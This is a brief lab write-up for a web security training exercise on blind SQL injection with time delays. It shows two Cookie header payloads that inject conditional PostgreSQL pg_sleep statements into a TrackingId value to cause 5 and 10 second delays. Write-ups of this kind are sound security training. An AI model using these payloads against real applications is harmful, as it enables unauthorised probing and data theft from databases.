# Lab: Blind SQL injection with time delays

URL: https://0a3e00ec03a7c2278062125200f200e2.web-security-academy.net

![](./Images/img1.png)

# Preparation:

Payload:

```
Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)ELSE+pg_SLEEP(0)+END)--+- session=P7HQ11CdfoRyMhQ9Hq15rMBKHKRaVKnw
```

![](./Images/img2.png)

# Exploitation:

## Performing a 10 second delay:

Payload:

```
Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)ELSE+pg_SLEEP(0)+END)--+- session=P7HQ11CdfoRyMhQ9Hq15rMBKHKRaVKnw
```

![](./Images/img3.png)

## Getting the User:

![](./Images/img4.png)
